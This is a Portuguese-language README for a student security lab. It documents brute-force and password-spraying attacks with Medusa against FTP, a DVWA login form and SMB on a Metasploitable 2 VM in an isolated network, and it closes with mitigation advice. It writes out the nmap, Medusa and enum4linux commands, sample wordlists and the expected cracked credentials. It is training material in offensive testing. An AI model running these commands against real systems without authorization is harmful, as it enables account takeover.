# Dio
Entrega do Desafio 
📘 Ataques de Força Bruta com Medusa em Ambiente Controlado
🧩 Sobre o Projeto

Este projeto faz parte do desafio da DIO, com o objetivo de aplicar na prática os conceitos aprendidos sobre testes de segurança, utilizando Kali Linux, Medusa, Metasploitable 2 e DVWA.

O foco é demonstrar ataques de força bruta, entender vulnerabilidades reais e documentar tudo de forma estruturada e profissional.

⚠️ Atenção:
Todas as atividades foram realizadas em ambiente controlado e privado.
Nunca execute testes de segurança sem autorização.

🎯 Objetivos do Desafio

Realizar ataques de força bruta em:

FTP

Formulário Web (DVWA)

SMB (Password Spraying)

Utilizar o Medusa em diferentes cenários.

Documentar técnicas, comandos e resultados.

Criar wordlists próprias.

Apresentar medidas de mitigação.

Compartilhar o projeto no GitHub como portfólio técnico.

🖥️ Ambiente Utilizado
Máquinas Virtuais
Máquina	Função	Sistema
Kali Linux	Atacante	Debian-based
Metasploitable 2	Máquina vulnerável	Ubuntu sem patches
DVWA	Aplicação Web vulnerável	PHP/MySQL
Configuração de Rede

VirtualBox Host-Only Adapter

VMs isoladas da internet

IPs utilizados:

Kali: 192.168.56.102

Metasploitable: 192.168.56.101

🔍 1. Descobrindo Serviços com Nmap

Antes dos ataques, foi realizado um mapeamento de portas e serviços:

nmap -sV -O 192.168.56.101


Serviços encontrados no Metasploitable 2:

FTP (21)

SSH (22)

Telnet (23)

HTTP (80)

SMB (139/445)

MySQL (3306)

📂 2. Wordlists Criadas
users.txt
root
msfadmin
user

passwords.txt
123
password
msfadmin
toor

smb_users.txt
root
nobody
msfadmin

🚀 3. Ataque FTP – Força Bruta com Medusa
Comando básico:
medusa -h 192.168.56.101 -u msfadmin -P passwords.txt -M ftp

Vários usuários:
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp

✔ Resultado esperado:
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin

🌐 4. Ataque Web – DVWA (Brute Force)
1. Ajustar DVWA

Menu → Security: Low

2. Identificação dos parâmetros

Via BurpSuite ou inspeção:

username

password

Login (botão)

3. Ataque com Medusa
medusa -h 192.168.56.101 -U users.txt -P passwords.txt \
-M web-form -m FORM:"/dvwa/vulnerabilities/brute/":"username=^USER^&password=^PASS^&Login=Login":"Login failed"

🖧 5. SMB – Password Spraying
1. Enumeração de usuários
enum4linux -U 192.168.56.101

2. Password Spraying
medusa -h 192.168.56.101 -U smb_users.txt -p msfadmin -M smbnt

🔑 6. Validação dos Acessos

FTP:

ftp 192.168.56.101


SMB:

smbclient -L 192.168.56.101 -U msfadmin


DVWA:

http://192.168.56.101/dvwa

🔐 7. Medidas de Mitigação
✔ Fortalecer políticas de senha

Senhas longas, complexas e únicas.

✔ Limitar tentativas de login

Fail2ban

PAM

AD Lockout

✔ Remover serviços inseguros

Desativar FTP e Telnet → utilizar SFTP e SSH.

✔ Adicionar MFA (Autenticação de múltiplos fatores)
✔ Monitoramento de logs

syslog

Apache

Samba

✔ Captcha em formulários web
✔ Atualização contínua de sistemas
📁 Estrutura do Repositório
/medusa-bruteforce-lab/
│── README.md
│── users.txt
│── passwords.txt
│── smb_users.txt
│── /images
│     ├── nmap.png
│     ├── medusa-ftp.png
│     ├── dvwa-attack.png
│     └── smb-spraying.png

🧠 Conclusão

Este laboratório demonstrou como ataques de força bruta podem rapidamente comprometer serviços mal configurados.
Utilizando o Medusa e ambientes vulneráveis, foi possível:

Entender falhas reais

Testar diferentes vetores (FTP, Web, SMB)

Criar wordlists

Validar acessos quebrados

Criar recomendações práticas de mitigação

Este projeto representa uma base sólida para aprofundar-se em pentest, segurança ofensiva e hardening de sistemas.

🔗 Referências

Kali Linux — https://www.kali.org

DVWA — https://github.com/digininja/DVWA

Medusa — https://tools.kali.org/password-attacks/medusa

Nmap — https://nmap.org/book/man.html

Enum4linux — https://github.com/CiscoCXSecurity/enum4linux
